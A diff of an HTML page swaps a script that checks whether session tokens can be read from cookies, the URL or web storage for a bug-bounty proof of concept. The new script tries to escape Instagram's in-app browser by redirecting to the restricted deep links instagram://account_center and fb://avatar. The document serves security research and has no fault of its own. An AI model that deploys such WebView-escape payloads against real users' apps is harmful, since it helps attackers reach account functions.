@@ -1,37 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>ATO Check</title>
+    <title>Meta Bug Bounty PoC</title>
 </head>
 <body>
-<script>
-  // Check 1: JS-readable cookies with auth/session patterns
-  const SESS_PAT = [/sess(ion)?/i,/\bauth\b/i,/token/i,/\bjwt\b/i,/access/i,/refresh/i,/csrf/i,/oauth/i,/remember/i,/user[_-]?id/i,/\buid\b/i,/identity/i];
-  const cookies = document.cookie.split(';').map(c => c.trim().split('=')[0].trim()).filter(Boolean);
-  const badCookie = cookies.some(name => SESS_PAT.some(p => p.test(name)));
-
-  // Check 2: OAuth tokens in URL hash or query string
-  const combined = location.hash + location.search;
-  const TOKEN_PARAMS = ['access_token','id_token','code','token','refresh_token','oauth_token'];
-  const badUrl = TOKEN_PARAMS.some(p => new RegExp('[?&#]' + p + '=', 'i').test(combined));
-
-  // Check 3: Auth tokens in localStorage / sessionStorage
-  const TOKEN_PAT = [/access[_-]?token/i,/id[_-]?token/i,/refresh[_-]?token/i,/auth[_-]?token/i,/\bjwt\b/i,/oauth/i,/api[_-]?key/i,/\bsecret\b/i];
-  function hasTokenInStorage(store) {
-    try {
-      for (let i = 0; i < store.length; i++) {
-        const key = store.key(i);
-        if (TOKEN_PAT.some(p => p.test(key))) return true;
-      }
-    } catch(e) {}
-    return false;
-  }
-  const badStorage = hasTokenInStorage(localStorage) || hasTokenInStorage(sessionStorage);
-
-  if (badCookie || badUrl || badStorage) {
-    document.write('success');
-  }
-</script>
+    <h1>Attempting WebView Escape...</h1>
+    <script>
+        // Once the Instagram In-App Browser loads this page, 
+        // we use JavaScript to attempt to fire the restricted native deep link.
+        setTimeout(function() {
+            window.location.href = "instagram://account_center";
+        }, 1000);
+        
+        // Fallback to the Facebook Canary just in case
+        setTimeout(function() {
+            window.location.href = "fb://avatar";
+        }, 2500);
+    </script>
 </body>
 </html>
